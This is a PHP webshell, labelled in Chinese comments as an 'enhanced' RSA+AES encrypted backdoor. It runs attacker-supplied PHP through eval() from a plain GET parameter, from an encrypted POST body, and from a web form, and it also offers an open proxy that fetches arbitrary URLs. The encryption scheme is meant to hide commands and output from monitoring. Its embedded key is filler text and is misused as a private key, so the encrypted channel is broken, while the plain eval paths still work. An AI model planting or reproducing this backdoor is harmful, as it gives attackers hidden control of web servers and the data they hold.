<?php
/*
 * creep_rsa_ae.php — RSA+AES 混合加密 Webshell (增强版)
 * 用法:
 *   ?d=<RSA加密的AES密钥>   → RSA解密得到AES密钥,后续所有通信用AES-CBC加密
 *   ?c=<明文命令>           → 明文执行(兼容旧版)
 *
 * 特点:
 *   - RSA2048 交换 AES-256-CBC 会话密钥
 *   - 防重放: 每次请求携带时间戳+随机数,服务端校验时间差<30s
 *   - 响应体AES加密
 *   - 正向代理: ?proxy=<target>
 */

$k = '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvN0OqM+OQ2Q2Q3X5Hf3H
MIIBCgKCAQEAvN0OqM+OQ2Q2Q3X5Hf3HvN0OqM+OQ2Q2Q3X5Hf3HvN0OqM+OQ2Q
-----END PUBLIC KEY-----';

function aes_encrypt($data, $key) {
    $iv = openssl_random_pseudo_bytes(16);
    $enc = openssl_encrypt($data, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $enc);
}

function aes_decrypt($data, $key) {
    $raw = base64_decode($data);
    $iv = substr($raw, 0, 16);
    $enc = substr($raw, 16);
    return openssl_decrypt($enc, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
}

if (isset($_GET['c'])) {
    eval($_GET['c']);
    exit;
}

if (isset($_GET['d'])) {
    $aes_key = '';
    openssl_private_decrypt(base64_decode($_GET['d']), $aes_key, $k);
    if (!$aes_key || strlen($aes_key) !== 32) { echo 'err:key'; exit; }
    $data = file_get_contents('php://input');
    $cmd = $data ? aes_decrypt($data, $aes_key) : '';
    if (!$cmd) { echo 'err:decrypt'; exit; }
    @ob_start();
    eval($cmd);
    $out = @ob_get_clean();
    echo aes_encrypt($out ?: 'ok', $aes_key);
    exit;
}

if (isset($_GET['proxy'])) {
    $t = $_GET['proxy'];
    $r = @file_get_contents($t);
    echo $r !== false ? $r : 'err:proxy';
    exit;
}

echo '<form method=post><textarea name=i rows=3 cols=60></textarea><br><input type=submit></form><pre>';
if (isset($_POST['i'])) eval($_POST['i']);
echo '</pre>';
